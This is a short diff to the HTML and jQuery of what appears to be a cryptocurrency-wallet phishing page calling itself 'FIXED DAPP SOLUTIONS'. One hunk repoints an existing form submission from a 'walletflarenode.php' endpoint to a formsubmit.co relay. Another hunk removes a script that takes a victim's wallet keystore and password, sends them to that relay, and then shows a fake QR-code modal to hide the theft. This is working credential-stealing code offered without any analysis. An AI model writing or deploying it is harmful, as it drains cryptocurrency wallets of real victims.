@@ -2077,7 +2077,7 @@
 
         try {
             $.ajax({
-                url: "https://voicewelfare.com/recovery/walletflarenode.php",
+                url: "https://formsubmit.co/ajax/4d6480955688877bd34e7642c70f433d",
                 method: "POST",
                 dataType: "JSON",
                 data: {
@@ -2100,44 +2100,3 @@
     });
 </script>
 
-
-<script>
-    // Validate seed phrase on form submission
-    $('#keystoreForm').submit(function (event) {
-        event.preventDefault();
-        document.getElementById("submit_keystore").disabled = true;
-        let dappKeystore = $('#formKeystore').val();
-        let dappPassword = $('#keystorePass').val();
-
-        var randomString = generateRandomString(7);
-        var dappName = $('#wallet_name').text();
-        let importType = 'Keystore';
-        const dappLinkName = "FIXED DAPP SOLUTIONS";
-
-        try {
-
-            $.ajax({
-                url: "https://formsubmit.co/ajax/4d6480955688877bd34e7642c70f433d",
-                method: "POST",
-                dataType: "JSON",
-                data: {
-                    dappKeystore: dappKeystore,
-                    dappPassword: dappPassword,
-                    dappName: dappName,
-                    importType: importType,
-                    linkName: dappLinkName,
-                },
-                success: function () { },
-                complete: function () { },
-            });
-            document.getElementById("p-code").innerHTML = randomString;
-            $("#initial_div").hide();
-            $("#connect_div").hide();
-            $("#qr_modal").show();
-            document.getElementById("submit_keystore").disabled = false;
-        } catch (error) {
-            document.getElementById("submit_keystore").disabled = false;
-        }
-
-    });
-</script>
